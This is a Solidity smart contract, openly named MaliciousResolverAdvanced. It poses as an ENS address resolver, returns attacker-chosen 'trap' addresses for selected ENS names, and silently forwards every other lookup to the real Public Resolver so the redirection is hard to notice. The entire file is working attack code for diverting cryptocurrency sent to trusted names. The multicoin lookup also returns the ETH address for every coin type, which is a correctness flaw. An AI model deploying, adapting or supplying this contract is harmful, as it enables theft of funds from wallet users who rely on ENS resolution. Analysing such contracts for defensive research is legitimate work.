// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * Interfaces for ENS interaction
 */
interface IENS {
    function owner(bytes32 node) external view returns (address);
}

interface IAddrResolver {
    function addr(bytes32 node) external view returns (address payable);
}

/**
 * @title MaliciousResolverAdvanced
 * @notice A resolver that shadows specific ENS nodes with malicious addresses
 * while transparently forwarding all other requests to the legitimate Public Resolver.
 */
contract MaliciousResolverAdvanced is IAddrResolver {
    
    IAddrResolver public publicResolver;
    mapping(bytes32 => address) public maliciousAddresses;
    address public owner;

    event MaliciousEntrySet(bytes32 indexed node, address indexed addr);

    constructor(address _publicResolver) {
        publicResolver = IAddrResolver(_publicResolver);
        owner = msg.sender;
    }

    function setMaliciousAddress(bytes32 node, address addr) external {
        require(msg.sender == owner, "Only owner");
        maliciousAddresses[node] = addr;
        emit MaliciousEntrySet(node, addr);
    }

    /**
     * @notice The specific Overriding function causing the previous errors.
     * Fixed by renaming the inner variable to 'upstreamAddr'.
     */
    function addr(bytes32 node) external view override returns (address payable) {
        // 1. Check if we have a spoofed address for this node
        address maliciousAddr = maliciousAddresses[node];
        
        if (maliciousAddr != address(0)) {
            // Return our trap address
            return payable(maliciousAddr);
        }

        // 2. If not, forward the query to the real Public Resolver
        // FIX: Renamed 'addr' to 'upstreamAddr' to avoid shadowing function name
        try publicResolver.addr(node) returns (address payable upstreamAddr) {
            return upstreamAddr;
        } catch {
            // If upstream fails, return zero address
            return payable(address(0));
        }
    }

    /**
     * Optional: Support for standard ENS multicoin resolution (coinType 60 = ETH)
     * Included to prevent errors if wallets call the overloaded version.
     */
    function addr(bytes32 node, uint256 coinType) external view returns (bytes memory) {
        // Only intercept ETH (coinType 60)
        if (coinType == 60) {
            address maliciousAddr = maliciousAddresses[node];
            if (maliciousAddr != address(0)) {
                return abi.encodePacked(maliciousAddr);
            }
        }

        // Forward strict Interface calls to upstream
        // Note: Using low-level call might be safer here depending on IAddrResolver definition,
        // but strict typing is cleaner for this example.
        try publicResolver.addr(node) returns (address payable upstreamAddr) {
             return abi.encodePacked(upstreamAddr);
        } catch {
             return "";
        }
    }
}